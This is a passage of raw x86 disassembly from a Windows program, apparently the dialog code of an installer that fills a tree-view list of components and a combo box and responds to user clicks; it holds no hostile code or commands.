  404935:	8b 0d 48 37 42 00    	mov    0x423748,%ecx
  40493b:	33 c0                	xor    %eax,%eax
  40493d:	85 d2                	test   %edx,%edx
  40493f:	74 18                	je     0x404959
  404941:	56                   	push   %esi
  404942:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404946:	74 07                	je     0x40494f
  404948:	8b 74 24 08          	mov    0x8(%esp),%esi
  40494c:	03 04 b1             	add    (%ecx,%esi,4),%eax
  40494f:	81 c1 18 04 00 00    	add    $0x418,%ecx
  404955:	4a                   	dec    %edx
  404956:	75 ea                	jne    0x404942
  404958:	5e                   	pop    %esi
  404959:	c2 04 00             	ret    $0x4
  40495c:	55                   	push   %ebp
  40495d:	8b ec                	mov    %esp,%ebp
  40495f:	83 ec 38             	sub    $0x38,%esp
  404962:	56                   	push   %esi
  404963:	8b 35 00 72 40 00    	mov    0x407200,%esi
  404969:	57                   	push   %edi
  40496a:	8b 7d 08             	mov    0x8(%ebp),%edi
  40496d:	6a 00                	push   $0x0
  40496f:	6a 09                	push   $0x9
  404971:	68 0a 11 00 00       	push   $0x110a
  404976:	57                   	push   %edi
  404977:	ff d6                	call   *%esi
  404979:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40497d:	74 3c                	je     0x4049bb
  40497f:	ff 15 ac 71 40 00    	call   *0x4071ac
  404985:	0f bf c8             	movswl %ax,%ecx
  404988:	c1 e8 10             	shr    $0x10,%eax
  40498b:	0f bf c0             	movswl %ax,%eax
  40498e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404991:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404994:	50                   	push   %eax
  404995:	57                   	push   %edi
  404996:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404999:	ff 15 84 71 40 00    	call   *0x407184
  40499f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4049a2:	50                   	push   %eax
  4049a3:	6a 00                	push   $0x0
  4049a5:	68 11 11 00 00       	push   $0x1111
  4049aa:	57                   	push   %edi
  4049ab:	ff d6                	call   *%esi
  4049ad:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  4049b1:	75 05                	jne    0x4049b8
  4049b3:	83 c8 ff             	or     $0xffffffff,%eax
  4049b6:	eb 1e                	jmp    0x4049d6
  4049b8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4049bb:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4049be:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4049c1:	50                   	push   %eax
  4049c2:	6a 00                	push   $0x0
  4049c4:	68 0c 11 00 00       	push   $0x110c
  4049c9:	57                   	push   %edi
  4049ca:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4049d1:	ff d6                	call   *%esi
  4049d3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049d6:	5f                   	pop    %edi
  4049d7:	5e                   	pop    %esi
  4049d8:	c9                   	leave
  4049d9:	c2 08 00             	ret    $0x8
  4049dc:	56                   	push   %esi
  4049dd:	57                   	push   %edi
  4049de:	be 00 40 42 00       	mov    $0x424000,%esi
  4049e3:	bf 08 fd 41 00       	mov    $0x41fd08,%edi
  4049e8:	56                   	push   %esi
  4049e9:	57                   	push   %edi
  4049ea:	e8 7b 15 00 00       	call   0x405f6a
  4049ef:	ff 74 24 10          	push   0x10(%esp)
  4049f3:	56                   	push   %esi
  4049f4:	e8 cf 14 00 00       	call   0x405ec8
  4049f9:	ff 74 24 0c          	push   0xc(%esp)
  4049fd:	e8 09 ca ff ff       	call   0x40140b
  404a02:	57                   	push   %edi
  404a03:	56                   	push   %esi
  404a04:	e8 61 15 00 00       	call   0x405f6a
  404a09:	5f                   	pop    %edi
  404a0a:	5e                   	pop    %esi
  404a0b:	c2 08 00             	ret    $0x8
  404a0e:	55                   	push   %ebp
  404a0f:	8b ec                	mov    %esp,%ebp
  404a11:	83 ec 50             	sub    $0x50,%esp
  404a14:	53                   	push   %ebx
  404a15:	56                   	push   %esi
  404a16:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404a1c:	57                   	push   %edi
  404a1d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404a20:	68 f9 03 00 00       	push   $0x3f9
  404a25:	57                   	push   %edi
  404a26:	ff d6                	call   *%esi
  404a28:	68 08 04 00 00       	push   $0x408
  404a2d:	57                   	push   %edi
  404a2e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a31:	ff d6                	call   *%esi
  404a33:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404a36:	a1 48 37 42 00       	mov    0x423748,%eax
  404a3b:	8b 35 00 72 40 00    	mov    0x407200,%esi
  404a41:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404a44:	a1 14 37 42 00       	mov    0x423714,%eax
  404a49:	33 db                	xor    %ebx,%ebx
  404a4b:	05 94 00 00 00       	add    $0x94,%eax
  404a50:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a57:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404a5a:	0f 85 1a 02 00 00    	jne    0x404c7a
  404a60:	a1 4c 37 42 00       	mov    0x42374c,%eax
  404a65:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404a68:	c1 e0 02             	shl    $0x2,%eax
  404a6b:	50                   	push   %eax
  404a6c:	6a 40                	push   $0x40
  404a6e:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  404a75:	89 3d 80 37 42 00    	mov    %edi,0x423780
  404a7b:	ff 15 58 71 40 00    	call   *0x407158
  404a81:	6a 6e                	push   $0x6e
  404a83:	a3 00 fd 41 00       	mov    %eax,0x41fd00
  404a88:	ff 35 00 37 42 00    	push   0x423700
  404a8e:	ff 15 b0 71 40 00    	call   *0x4071b0
  404a94:	83 0d f4 fc 41 00 ff 	orl    $0xffffffff,0x41fcf4
  404a9b:	68 05 50 40 00       	push   $0x405005
  404aa0:	6a fc                	push   $0xfffffffc
  404aa2:	8b f8                	mov    %eax,%edi
  404aa4:	ff 75 fc             	push   -0x4(%ebp)
  404aa7:	ff 15 48 72 40 00    	call   *0x407248
  404aad:	53                   	push   %ebx
  404aae:	6a 06                	push   $0x6
  404ab0:	6a 21                	push   $0x21
  404ab2:	6a 10                	push   $0x10
  404ab4:	6a 10                	push   $0x10
  404ab6:	a3 fc fc 41 00       	mov    %eax,0x41fcfc
  404abb:	ff 15 38 70 40 00    	call   *0x407038
  404ac1:	68 ff 00 ff 00       	push   $0xff00ff
  404ac6:	57                   	push   %edi
  404ac7:	50                   	push   %eax
  404ac8:	a3 ec fc 41 00       	mov    %eax,0x41fcec
  404acd:	ff 15 3c 70 40 00    	call   *0x40703c
  404ad3:	ff 35 ec fc 41 00    	push   0x41fcec
  404ad9:	6a 02                	push   $0x2
  404adb:	68 09 11 00 00       	push   $0x1109
  404ae0:	ff 75 fc             	push   -0x4(%ebp)
  404ae3:	ff d6                	call   *%esi
  404ae5:	53                   	push   %ebx
  404ae6:	53                   	push   %ebx
  404ae7:	68 1c 11 00 00       	push   $0x111c
  404aec:	ff 75 fc             	push   -0x4(%ebp)
  404aef:	ff d6                	call   *%esi
  404af1:	83 f8 10             	cmp    $0x10,%eax
  404af4:	7d 0d                	jge    0x404b03
  404af6:	53                   	push   %ebx
  404af7:	6a 10                	push   $0x10
  404af9:	68 1b 11 00 00       	push   $0x111b
  404afe:	ff 75 fc             	push   -0x4(%ebp)
  404b01:	ff d6                	call   *%esi
  404b03:	57                   	push   %edi
  404b04:	ff 15 5c 70 40 00    	call   *0x40705c
  404b0a:	33 ff                	xor    %edi,%edi
  404b0c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404b0f:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404b12:	3b c3                	cmp    %ebx,%eax
  404b14:	74 27                	je     0x404b3d
  404b16:	83 ff 20             	cmp    $0x20,%edi
  404b19:	74 03                	je     0x404b1e
  404b1b:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404b1e:	50                   	push   %eax
  404b1f:	53                   	push   %ebx
  404b20:	e8 67 14 00 00       	call   0x405f8c
  404b25:	50                   	push   %eax
  404b26:	53                   	push   %ebx
  404b27:	68 43 01 00 00       	push   $0x143
  404b2c:	ff 75 f8             	push   -0x8(%ebp)
  404b2f:	ff d6                	call   *%esi
  404b31:	57                   	push   %edi
  404b32:	50                   	push   %eax
  404b33:	68 51 01 00 00       	push   $0x151
  404b38:	ff 75 f8             	push   -0x8(%ebp)
  404b3b:	ff d6                	call   *%esi
  404b3d:	47                   	inc    %edi
  404b3e:	83 ff 21             	cmp    $0x21,%edi
  404b41:	7c c9                	jl     0x404b0c
  404b43:	8b 7d 14             	mov    0x14(%ebp),%edi
  404b46:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  404b49:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  404b4d:	6a 15                	push   $0x15
  404b4f:	ff 75 08             	push   0x8(%ebp)
  404b52:	e8 b2 f4 ff ff       	call   0x404009
  404b57:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  404b5b:	6a 16                	push   $0x16
  404b5d:	ff 75 08             	push   0x8(%ebp)
  404b60:	e8 a4 f4 ff ff       	call   0x404009
  404b65:	33 ff                	xor    %edi,%edi
  404b67:	33 db                	xor    %ebx,%ebx
  404b69:	39 3d 4c 37 42 00    	cmp    %edi,0x42374c
  404b6f:	0f 8e c4 00 00 00    	jle    0x404c39
  404b75:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b78:	8d 50 08             	lea    0x8(%eax),%edx
  404b7b:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404b7e:	8d 42 10             	lea    0x10(%edx),%eax
  404b81:	80 38 00             	cmpb   $0x0,(%eax)
  404b84:	0f 84 90 00 00 00    	je     0x404c1a
  404b8a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404b8d:	8b 02                	mov    (%edx),%eax
  404b8f:	6a 20                	push   $0x20
  404b91:	8b d0                	mov    %eax,%edx
  404b93:	59                   	pop    %ecx
  404b94:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  404b97:	23 d1                	and    %ecx,%edx
  404b99:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404ba0:	a8 02                	test   $0x2,%al
  404ba2:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  404ba9:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404bac:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404baf:	89 55 c0             	mov    %edx,-0x40(%ebp)
  404bb2:	74 38                	je     0x404bec
  404bb4:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404bb7:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  404bbe:	50                   	push   %eax
  404bbf:	6a 00                	push   $0x0
  404bc1:	68 00 11 00 00       	push   $0x1100
  404bc6:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  404bcd:	ff 75 fc             	push   -0x4(%ebp)
  404bd0:	ff d6                	call   *%esi
  404bd2:	8b 0d 00 fd 41 00    	mov    0x41fd00,%ecx
  404bd8:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  404bdf:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404be2:	a1 00 fd 41 00       	mov    0x41fd00,%eax
  404be7:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  404bea:	eb 2e                	jmp    0x404c1a
  404bec:	a8 04                	test   $0x4,%al
  404bee:	74 11                	je     0x404c01
  404bf0:	53                   	push   %ebx
  404bf1:	6a 03                	push   $0x3
  404bf3:	68 0a 11 00 00       	push   $0x110a
  404bf8:	ff 75 fc             	push   -0x4(%ebp)
  404bfb:	ff d6                	call   *%esi
  404bfd:	8b d8                	mov    %eax,%ebx
  404bff:	eb 19                	jmp    0x404c1a
  404c01:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404c04:	50                   	push   %eax
  404c05:	6a 00                	push   $0x0
  404c07:	68 00 11 00 00       	push   $0x1100
  404c0c:	ff 75 fc             	push   -0x4(%ebp)
  404c0f:	ff d6                	call   *%esi
  404c11:	8b 0d 00 fd 41 00    	mov    0x41fd00,%ecx
  404c17:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404c1a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404c1d:	47                   	inc    %edi
  404c1e:	81 c2 18 04 00 00    	add    $0x418,%edx
  404c24:	3b 3d 4c 37 42 00    	cmp    0x42374c,%edi
  404c2a:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404c2d:	0f 8c 4b ff ff ff    	jl     0x404b7e
  404c33:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  404c37:	75 19                	jne    0x404c52
  404c39:	6a f0                	push   $0xfffffff0
  404c3b:	ff 75 fc             	push   -0x4(%ebp)
  404c3e:	ff 15 9c 71 40 00    	call   *0x40719c
  404c44:	24 fb                	and    $0xfb,%al
  404c46:	50                   	push   %eax
  404c47:	6a f0                	push   $0xfffffff0
  404c49:	ff 75 fc             	push   -0x4(%ebp)
  404c4c:	ff 15 48 72 40 00    	call   *0x407248
  404c52:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404c56:	75 18                	jne    0x404c70
  404c58:	6a 05                	push   $0x5
  404c5a:	ff 75 f8             	push   -0x8(%ebp)
  404c5d:	ff 15 78 72 40 00    	call   *0x407278
  404c63:	ff 75 f8             	push   -0x8(%ebp)
  404c66:	e8 d3 f3 ff ff       	call   0x40403e
  404c6b:	e9 80 03 00 00       	jmp    0x404ff0
  404c70:	ff 75 fc             	push   -0x4(%ebp)
  404c73:	e8 c6 f3 ff ff       	call   0x40403e
  404c78:	33 db                	xor    %ebx,%ebx
  404c7a:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404c81:	75 12                	jne    0x404c95
  404c83:	33 c9                	xor    %ecx,%ecx
  404c85:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404c88:	41                   	inc    %ecx
  404c89:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c90:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404c93:	eb 03                	jmp    0x404c98
  404c95:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404c98:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404c9c:	b8 13 04 00 00       	mov    $0x413,%eax
  404ca1:	74 09                	je     0x404cac
  404ca3:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404ca6:	0f 85 e4 00 00 00    	jne    0x404d90
  404cac:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404caf:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404cb2:	74 0d                	je     0x404cc1
  404cb4:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404cbb:	0f 85 cf 00 00 00    	jne    0x404d90
  404cc1:	f6 05 1d 37 42 00 02 	testb  $0x2,0x42371d
  404cc8:	75 73                	jne    0x404d3d
  404cca:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404ccd:	74 09                	je     0x404cd8
  404ccf:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404cd2:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404cd6:	75 65                	jne    0x404d3d
  404cd8:	33 c9                	xor    %ecx,%ecx
  404cda:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404cdd:	0f 95 c1             	setne  %cl
  404ce0:	51                   	push   %ecx
  404ce1:	ff 75 fc             	push   -0x4(%ebp)
  404ce4:	e8 73 fc ff ff       	call   0x40495c
  404ce9:	8b f8                	mov    %eax,%edi
  404ceb:	3b fb                	cmp    %ebx,%edi
  404ced:	7c 4e                	jl     0x404d3d
  404cef:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404cf5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cf8:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404cfc:	8b 01                	mov    (%ecx),%eax
  404cfe:	a8 10                	test   $0x10,%al
  404d00:	75 3b                	jne    0x404d3d
  404d02:	a8 40                	test   $0x40,%al
  404d04:	74 11                	je     0x404d17
  404d06:	35 80 00 00 00       	xor    $0x80,%eax
  404d0b:	84 c0                	test   %al,%al
  404d0d:	79 04                	jns    0x404d13
  404d0f:	0c 01                	or     $0x1,%al
  404d11:	eb 07                	jmp    0x404d1a
  404d13:	24 fe                	and    $0xfe,%al
  404d15:	eb 03                	jmp    0x404d1a
  404d17:	83 f0 01             	xor    $0x1,%eax
  404d1a:	57                   	push   %edi
  404d1b:	89 01                	mov    %eax,(%ecx)
  404d1d:	e8 5b c4 ff ff       	call   0x40117d
  404d22:	a1 1c 37 42 00       	mov    0x42371c,%eax
  404d27:	47                   	inc    %edi
  404d28:	f7 d0                	not    %eax
  404d2a:	c1 e8 08             	shr    $0x8,%eax
  404d2d:	83 e0 01             	and    $0x1,%eax
  404d30:	89 7d 10             	mov    %edi,0x10(%ebp)
  404d33:	89 45 14             	mov    %eax,0x14(%ebp)
  404d36:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404d3d:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404d40:	74 4e                	je     0x404d90
  404d42:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d45:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404d4c:	75 0e                	jne    0x404d5c
  404d4e:	ff 70 5c             	push   0x5c(%eax)
  404d51:	53                   	push   %ebx
  404d52:	68 19 04 00 00       	push   $0x419
  404d57:	ff 75 fc             	push   -0x4(%ebp)
  404d5a:	ff d6                	call   *%esi
  404d5c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d5f:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404d66:	75 28                	jne    0x404d90
  404d68:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404d6c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d6f:	8b 40 5c             	mov    0x5c(%eax),%eax
  404d72:	75 0f                	jne    0x404d83
  404d74:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404d7a:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404d7e:	83 08 20             	orl    $0x20,(%eax)
  404d81:	eb 0d                	jmp    0x404d90
  404d83:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404d89:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404d8d:	83 20 df             	andl   $0xffffffdf,(%eax)
  404d90:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404d97:	75 6f                	jne    0x404e08
  404d99:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404d9f:	0f 85 4b 02 00 00    	jne    0x404ff0
  404da5:	8b 45 10             	mov    0x10(%ebp),%eax
  404da8:	c1 e8 10             	shr    $0x10,%eax
  404dab:	66 3d 01 00          	cmp    $0x1,%ax
  404daf:	0f 85 3b 02 00 00    	jne    0x404ff0
  404db5:	53                   	push   %ebx
  404db6:	53                   	push   %ebx
  404db7:	68 47 01 00 00       	push   $0x147
  404dbc:	ff 75 f8             	push   -0x8(%ebp)
  404dbf:	ff d6                	call   *%esi
  404dc1:	83 f8 ff             	cmp    $0xffffffff,%eax
  404dc4:	0f 84 26 02 00 00    	je     0x404ff0
  404dca:	53                   	push   %ebx
  404dcb:	50                   	push   %eax
  404dcc:	68 50 01 00 00       	push   $0x150
  404dd1:	ff 75 f8             	push   -0x8(%ebp)
  404dd4:	ff d6                	call   *%esi
  404dd6:	8b f8                	mov    %eax,%edi
  404dd8:	83 ff ff             	cmp    $0xffffffff,%edi
  404ddb:	74 08                	je     0x404de5
  404ddd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404de0:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404de3:	75 03                	jne    0x404de8
  404de5:	6a 20                	push   $0x20
  404de7:	5f                   	pop    %edi
  404de8:	57                   	push   %edi
  404de9:	e8 ab c4 ff ff       	call   0x401299
  404dee:	57                   	push   %edi
  404def:	53                   	push   %ebx
  404df0:	68 20 04 00 00       	push   $0x420
  404df5:	ff 75 08             	push   0x8(%ebp)
  404df8:	ff d6                	call   *%esi
  404dfa:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  404dfe:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404e01:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404e08:	b8 00 02 00 00       	mov    $0x200,%eax
  404e0d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404e10:	75 08                	jne    0x404e1a
  404e12:	53                   	push   %ebx
  404e13:	53                   	push   %ebx
  404e14:	50                   	push   %eax
  404e15:	ff 75 fc             	push   -0x4(%ebp)
  404e18:	ff d6                	call   *%esi
  404e1a:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404e21:	75 32                	jne    0x404e55
  404e23:	a1 ec fc 41 00       	mov    0x41fcec,%eax
  404e28:	3b c3                	cmp    %ebx,%eax
  404e2a:	74 07                	je     0x404e33
  404e2c:	50                   	push   %eax
  404e2d:	ff 15 40 70 40 00    	call   *0x407040
  404e33:	a1 00 fd 41 00       	mov    0x41fd00,%eax
  404e38:	3b c3                	cmp    %ebx,%eax
  404e3a:	74 07                	je     0x404e43
  404e3c:	50                   	push   %eax
  404e3d:	ff 15 5c 71 40 00    	call   *0x40715c
  404e43:	89 1d ec fc 41 00    	mov    %ebx,0x41fcec
  404e49:	89 1d 00 fd 41 00    	mov    %ebx,0x41fd00
  404e4f:	89 1d 80 37 42 00    	mov    %ebx,0x423780
  404e55:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404e5c:	0f 85 50 01 00 00    	jne    0x404fb2
  404e62:	53                   	push   %ebx
  404e63:	53                   	push   %ebx
  404e64:	e8 86 c3 ff ff       	call   0x4011ef
  404e69:	8b 45 10             	mov    0x10(%ebp),%eax
  404e6c:	3b c3                	cmp    %ebx,%eax
  404e6e:	74 0e                	je     0x404e7e
  404e70:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e73:	74 01                	je     0x404e76
  404e75:	48                   	dec    %eax
  404e76:	50                   	push   %eax
  404e77:	6a 08                	push   $0x8
  404e79:	e8 5e fb ff ff       	call   0x4049dc
  404e7e:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  404e81:	74 3f                	je     0x404ec2
  404e83:	ff 35 00 fd 41 00    	push   0x41fd00
  404e89:	e8 54 c4 ff ff       	call   0x4012e2
  404e8e:	8b f8                	mov    %eax,%edi
  404e90:	57                   	push   %edi
  404e91:	e8 03 c4 ff ff       	call   0x401299
  404e96:	33 c0                	xor    %eax,%eax
  404e98:	33 c9                	xor    %ecx,%ecx
  404e9a:	3b fb                	cmp    %ebx,%edi
  404e9c:	7e 0e                	jle    0x404eac
  404e9e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404ea1:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  404ea4:	74 01                	je     0x404ea7
  404ea6:	41                   	inc    %ecx
  404ea7:	40                   	inc    %eax
  404ea8:	3b c7                	cmp    %edi,%eax
  404eaa:	7c f2                	jl     0x404e9e
  404eac:	53                   	push   %ebx
  404ead:	51                   	push   %ecx
  404eae:	68 4e 01 00 00       	push   $0x14e
  404eb3:	ff 75 f8             	push   -0x8(%ebp)
  404eb6:	ff d6                	call   *%esi
  404eb8:	89 7d 14             	mov    %edi,0x14(%ebp)
  404ebb:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404ec2:	53                   	push   %ebx
  404ec3:	53                   	push   %ebx
  404ec4:	e8 26 c3 ff ff       	call   0x4011ef
  404ec9:	a1 00 fd 41 00       	mov    0x41fd00,%eax
  404ece:	39 1d 4c 37 42 00    	cmp    %ebx,0x42374c
  404ed4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404ed7:	a1 48 37 42 00       	mov    0x423748,%eax
  404edc:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404ee3:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404ee6:	0f 8e 9c 00 00 00    	jle    0x404f88
  404eec:	8d 78 08             	lea    0x8(%eax),%edi
  404eef:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404ef2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ef5:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404ef8:	3b c3                	cmp    %ebx,%eax
  404efa:	74 74                	je     0x404f70
  404efc:	8b 0f                	mov    (%edi),%ecx
  404efe:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404f01:	f6 c5 01             	test   $0x1,%ch
  404f04:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404f0b:	74 11                	je     0x404f1e
  404f0d:	8d 47 10             	lea    0x10(%edi),%eax
  404f10:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404f17:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f1a:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  404f1e:	f6 c1 40             	test   $0x40,%cl
  404f21:	74 05                	je     0x404f28
  404f23:	6a 03                	push   $0x3
  404f25:	58                   	pop    %eax
  404f26:	eb 0e                	jmp    0x404f36
  404f28:	8b c1                	mov    %ecx,%eax
  404f2a:	83 e0 01             	and    $0x1,%eax
  404f2d:	40                   	inc    %eax
  404f2e:	f6 c1 10             	test   $0x10,%cl
  404f31:	74 03                	je     0x404f36
  404f33:	83 c0 03             	add    $0x3,%eax
  404f36:	8b d1                	mov    %ecx,%edx
  404f38:	ff 75 c0             	push   -0x40(%ebp)
  404f3b:	c1 e0 0b             	shl    $0xb,%eax
  404f3e:	83 e2 08             	and    $0x8,%edx
  404f41:	0b c2                	or     %edx,%eax
  404f43:	8b d1                	mov    %ecx,%edx
  404f45:	c1 f9 05             	sar    $0x5,%ecx
  404f48:	03 c0                	add    %eax,%eax
  404f4a:	83 e2 20             	and    $0x20,%edx
  404f4d:	83 e1 01             	and    $0x1,%ecx
  404f50:	0b c2                	or     %edx,%eax
  404f52:	41                   	inc    %ecx
  404f53:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404f56:	51                   	push   %ecx
  404f57:	68 02 11 00 00       	push   $0x1102
  404f5c:	ff 75 fc             	push   -0x4(%ebp)
  404f5f:	ff d6                	call   *%esi
  404f61:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404f64:	50                   	push   %eax
  404f65:	53                   	push   %ebx
  404f66:	68 0d 11 00 00       	push   $0x110d
  404f6b:	ff 75 fc             	push   -0x4(%ebp)
  404f6e:	ff d6                	call   *%esi
  404f70:	ff 45 f0             	incl   -0x10(%ebp)
  404f73:	81 c7 18 04 00 00    	add    $0x418,%edi
  404f79:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f7c:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  404f82:	0f 8c 67 ff ff ff    	jl     0x404eef
  404f88:	6a 01                	push   $0x1
  404f8a:	53                   	push   %ebx
  404f8b:	ff 75 fc             	push   -0x4(%ebp)
  404f8e:	ff 15 fc 71 40 00    	call   *0x4071fc
  404f94:	a1 dc 2e 42 00       	mov    0x422edc,%eax
  404f99:	39 58 10             	cmp    %ebx,0x10(%eax)
  404f9c:	74 14                	je     0x404fb2
  404f9e:	6a 05                	push   $0x5
  404fa0:	e8 8a f9 ff ff       	call   0x40492f
  404fa5:	50                   	push   %eax
  404fa6:	6a fb                	push   $0xfffffffb
  404fa8:	68 ff 03 00 00       	push   $0x3ff
  404fad:	e8 65 f9 ff ff       	call   0x404917
  404fb2:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404fb9:	75 35                	jne    0x404ff0
  404fbb:	f6 05 1d 37 42 00 01 	testb  $0x1,0x42371d
  404fc2:	74 2c                	je     0x404ff0
  404fc4:	33 c0                	xor    %eax,%eax
  404fc6:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404fca:	8b 35 78 72 40 00    	mov    0x407278,%esi
  404fd0:	0f 94 c0             	sete   %al
  404fd3:	c1 e0 03             	shl    $0x3,%eax
  404fd6:	8b f8                	mov    %eax,%edi
  404fd8:	57                   	push   %edi
  404fd9:	ff 75 fc             	push   -0x4(%ebp)
  404fdc:	ff d6                	call   *%esi
  404fde:	57                   	push   %edi
  404fdf:	68 fe 03 00 00       	push   $0x3fe
  404fe4:	ff 75 08             	push   0x8(%ebp)
  404fe7:	ff 15 44 72 40 00    	call   *0x407244
  404fed:	50                   	push   %eax
  404fee:	ff d6                	call   *%esi
  404ff0:	ff 75 14             	push   0x14(%ebp)
  404ff3:	ff 75 10             	push   0x10(%ebp)
  404ff6:	ff 75 0c             	push   0xc(%ebp)
  404ff9:	e8 72 f0 ff ff       	call   0x404070
  404ffe:	5f                   	pop    %edi
  404fff:	5e                   	pop    %esi
  405000:	5b                   	pop    %ebx
  405001:	c9                   	leave
  405002:	c2 10 00             	ret    $0x10
  405005:	55                   	push   %ebp
  405006:	8b ec                	mov    %esp,%ebp
  405008:	53                   	push   %ebx
  405009:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40500c:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  405012:	57                   	push   %edi
  405013:	75 14                	jne    0x405029
  405015:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  405019:	75 59                	jne    0x405074
  40501b:	68 13 04 00 00       	push   $0x413
